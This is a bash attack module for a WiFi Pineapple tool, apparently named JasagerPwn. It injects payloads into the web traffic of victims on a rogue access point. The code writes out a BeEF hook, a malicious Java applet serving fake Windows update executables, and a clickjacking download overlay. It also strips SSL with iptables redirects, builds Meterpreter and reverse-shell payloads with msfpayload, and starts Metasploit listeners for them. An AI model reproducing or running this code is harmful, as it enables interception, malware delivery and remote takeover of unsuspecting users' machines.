#
# Inject multiple attack vectors into the victims
# browser as they surf the internet.
#
# - Supports BeEf Hook, Click Jacking, Java Applet, and SSLStrip
#   in all possible combinations.
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="Multi-Injector"
# Create a description for menu
description="Multi-Payload Transparent Injection"
# Letter keys/commands to select item in menu
bindings="I|i"
#########################################

# Variables
multi_www="/var/www/multi-inject"
beef_mode="0"
clickjack_mode="0"
java_mode="0"
sslstrip_mode="0"

# Attack Functions
# Prepare the Java Applet specific tasks
function prep_javaapplet(){
  echo -e "\e[01;34m[-]\e[00m Preparing Java Applet Transparent Injection Attack..." 
  
  cp src/Signed_Update.jar "${multi_www}/"  > /dev/null 2>&1
  
  # Create our powershell payload
  echo -e "\e[01;34m[>]\e[00m Generating x86 and x64 PowerShell code..."  
  if [ -x "src/powershell_payload.py" ]; then chmod +x src/powershell_payload.py ; fi
  python src/powershell_payload.py "${our_ip}" "${ps_win_port}"
  x86="$(cat /tmp/x86.powershell.alnum)" 
  x64="$(cat /tmp/x64.powershell.alnum)"
  
  # Our Applet Code to Inject
  echo "<applet width=\"1\" height=\"1\" id=\"Secure Java Applet\" code=\"Java.class\" archive=\"http://${our_ip}:80/Signed_Update.jar\"><param name=\"WINDOWS\" value=\"http://${our_ip}:80/Windows-KB183905-x86-ENU.exe\"><param name=\"STUFF\" value=\"\"><param name=\"OSX\" value=\"http://${our_ip}:80/osx.bin\"><param name=\"LINUX\" value=\"http://${our_ip}:80/nix.bin\"><param name=\"nextPage\" value=\"#\"><param name=\"64\" value=\"${x64}\"><param name=\"86\" value=\"${x86}\"><param name=\"separate_jvm\" value=\"true\"/></applet>" >> /tmp/injectme.txt
      
  # Mac OSX Payload 
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (OSX)" -e "msfpayload osx/x86/shell_reverse_tcp LPORT=${osx_port} LHOST=${our_ip} X > ${multi_www}/osx.bin"
  # Linux Payload
  xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Linux)" -e "msfpayload linux/x86/shell/reverse_tcp LPORT=${nix_port} LHOST=${our_ip} X  > ${multi_www}/nix.bin"
}

# Prepare the BeEF hook specific tasks
function prep_beef(){
  echo -e "\e[01;34m[-]\e[00m Preparing BeEF Javascript Hook Injection Attack..." 
  echo '<script src=\"http://'${our_ip}':3000/hook.js\" type=\"text/javascript\"></script>' >> /tmp/injectme.txt
  # Start up BeEf
  echo -e "\e[01;34m[>]\e[00m Starting up Beef..."  
  terminator -e "cd /opt/beef ; ruby beef" > /dev/null 2>&1 &
  pid_beef=$(echo $!)
}

# Prepare SSLSstrip to redirect into the injection proxy
function prep_sslstrip(){
  echo -e "\e[01;34m[-]\e[00m Preparing SSLStrip Attack Vector for Injection Attack..."
  command="bash /pineapple/components/infusions/sslstrip/includes/sslstrip.sh"
  pineapple_command
}

# Prepare the click jacking specific tasks
function prep_clickjack(){
  echo -e "\e[01;34m[-]\e[00m Preparing Click Jacking Download Injection Attack..." 
  echo '<script src="http://code.jquery.com/jquery-1.9.1.min.js"></script><script>$(document).ready(function(){var div=document.createElement("div");div.id="overlay";div.style.zIndex="100";div.style.width="100%";div.style.height="100%";div.style.position="fixed";div.onclick=function(){window.open("http://'${our_ip}'/run.php")};if(document.body.firstChild)document.body.insertBefore(div,document.body.firstChild);else document.body.appendChild(div)});</script>' >> /tmp/injectme.txt
  
  # Setup our web server for click jacking requests
  cp src/web_templates/clickjack-www/* "${multi_www}"
  sed -i "s/REPLACEMEIP/${our_ip}/g" ${multi_www}/run.php 2> /dev/null
  
  # Mac Payload  - we need a .pkg payload for Mac OSX
  if [ ! "${mac_payload}" ] || [ ! -e "${mac_payload}" ]; then
    echo -e "\e[01;31m[!]\e[00m Error: Mac Payload not found and a metasploit payload will not work. Set your payload name in \"mac_payload\": ${mac_payload}"
    sleep 1
  else
    cp -f "${mac_payload}" "src/web_templates/clickjack-www/Apple_MacOSX_Update.pkg"
  fi
  
}

# Preform general preperation for the injection attack vectors
function prep_general(){
  # Cleanup our injection code from previous runs
  if [ -e "/tmp/injectme.txt" ]; then rm -f /tmp/injectme.txt ; fi
  
  # Setup our Apache server for the attacks that require it
  if [ "${beef_mode}" == "1" ] || [ "${java_mode}" == "1" ] || [ "${clickjack_mode}" == "1" ]; then
    echo -e "\e[01;34m[>]\e[00m Setting up Apache server...."  
    if [ ! -e "${multi_www}" ]; then mkdir "${multi_www}" ; fi
    rm -rf "${multi_www}/*" > /dev/null 2>&1
    echo "<VirtualHost *:80>
	    ServerAdmin webmaster@localhost
	    DocumentRoot ${multi_www}
	    <Directory />
		    Options FollowSymLinks
		    AllowOverride None
	    </Directory>
	    <Directory ${multi_www}>
		    Options Indexes FollowSymLinks MultiViews
		    AllowOverride None
		    Order allow,deny
		    allow from all
	    </Directory>
	    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
	    <directory \"/usr/lib/cgi-bin\">
		    AllowOverride None
		    Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
		    Order allow,deny
		    Allow from all
	    </directory>
	    ErrorDocument 403 /index.html
	    ErrorDocument 404 /index.html
    </VirtualHost>
    " > /etc/apache2/sites-available/multi-inject
    
    # Make a redirecting index.html incase someone browses to us
    echo -e '<html>\n<head><meta http-equiv="refresh" content="0; url=http://yahoo.com/"></head></html>' 1> ${multi_www}/index.html 2> /dev/null
    
    xterm -geometry 75x8+100+0 -T "[JasagerPwn] v${version} - Starting Apache2" -e "ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite multi-inject && a2enmod php5 && /etc/init.d/apache2 reload"
    service apache2 restart > /dev/null 2>&1
  fi
  
  # Setup our metasploit payloads & listeners if the attack requires it
  if [ "${java_mode}" == "1" ] || [ "${clickjack_mode}" == "1" ]; then
    # Windows Payload - Already selective and will be the same for both java / clickjack mode
    echo -e "\e[01;34m[>]\e[00m Generating binary payloads..."  
    if [ ! "${windows_payload}" ]; then
      xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${multi_www}/Windows-KB183905-x86-ENU.exe"
    else
      if [ -e "${windows_payload}" ]; then
	cp -f "${windows_payload}" "${multi_www}/Windows-KB183905-x86-ENU.exe"
      else
	echo -e "\e[01;34m[-]\e[00m Notice: Windows Payload was not found. Defaulting back to metasploit..."
	xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${multi_www}/Windows-KB183905-x86-ENU.exe"
      fi
    fi

    # Metasploit resource script
    echo -e "use exploit/multi/handler
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT ${win_port}
    set ExitOnSession false
    set AutoRunScript ""
    exploit -j
    set PAYLOAD osx/x86/shell_reverse_tcp
    set LHOST 0.0.0.0
    set LPORT ${osx_port}
    set ExitOnSession false
    set AutoRunScript ""
    exploit -j
    set PAYLOAD linux/x86/shell/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT ${nix_port}
    set ExitOnSession false
    set AutoRunScript ""
    exploit -j
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 0.0.0.0
    set LPORT ${ps_win_port}
    set AutoRunScript migrate -f -k
    set ExitOnSession false
    exploit -j
    jobs -v" > /tmp/msfrc
    
    # Get our payload listener's ready
    echo -e "\e[01;34m[>]\e[00m Starting metasploit listeners..."  
    terminator -e "msfconsole -r /tmp/msfrc" > /dev/null 2>&1 &
  fi
 
}

# Start Function
function start_multi(){
  echo "" |  read -e
  echo -e "\e[01;34m[>]\e[00m Running Transparent Multi-Injector Attack..."  
  echo -e "\e[01;34m[-]\e[00m Do you want to use sslstrip? This will allow for injection on every page."  
  echo -n -e "\e[01;32m[?]\e[00m Choice [Y/N] : "
  read -e choice3
  
  echo -e "\e[01;34m[1]\e[00m BeEF JavaScript Hook Injection"
  echo -e "\e[01;34m[2]\e[00m Java Applet Injection"
  echo -e "\e[01;34m[3]\e[00m Click Jacking Injection"
  echo -n -e "\e[01;32m[?]\e[00m Choose the attack numbers from below: [1|12|123|23|13]: "
  read -e choice4
  
  # Preform general tasks used by multiple vectors
  prep_general
  
  # Setup the rest of the attack vectors based on user input
  if [ "${choice3}" == "y" ] || [ "${choice3}" == "Y" ]; then prep_sslstrip ; fi
  if [ "$(echo ${choice4} | grep 1)" ]; then beef_mode="1" ; prep_beef ; fi
  if [ "$(echo ${choice4} | grep 2)" ]; then java_mode="1" ; prep_javaapplet ; fi
  if [ "$(echo ${choice4} | grep 3)" ]; then clickjack_mode="1" ; prep_clickjack ; fi
  
  # Start up code injector for java applet injection
  echo -e "\e[01;34m[>]\e[00m Enabling code injection on pineapple.."
  if [ -e "/tmp/injectme.txt" ]; then
    cp /tmp/injectme.txt "${multi_www}"
    chown -R www-data:www-data "${multi_www}"
  fi
  
  # Start up our proxy and setup iptables - need some more rules if we are stripping SSL.
  if [ "${sslstrip_mode}" == "1" ]; then 
    iptables="iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000 ; iptables -t nat -A PREROUTING -p tcp --source-port 10000 -j REDIRECT --to-ports 8888"
    command="killall -9 ruby ; wget -O /pineapple/components/infusions/codeinject/includes/resource/injectme.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/codeinject/includes/resource/attacker_ip.txt ; cd /pineapple/components/infusions/codeinject/includes/proxy ; ${iptables} ; bash proxy.sh \"$(cat ../resource/injectme.txt)\""
    pineapple_command
  else
    command="killall -9 ruby ; wget -O /pineapple/components/infusions/codeinject/includes/resource/injectme.txt http://${our_ip}/injectme.txt ; echo ${our_ip} > /pineapple/components/infusions/codeinject/includes/resource/attacker_ip.txt ; cd /pineapple/components/infusions/codeinject/includes ; bash autostart.sh"
    pineapple_command
  fi
  
}

# Stop Function
function stop_multi(){
  command="cd /pineapple/components/infusions/codeinject/includes/ ; bash stop.sh"
  pineapple_command
}

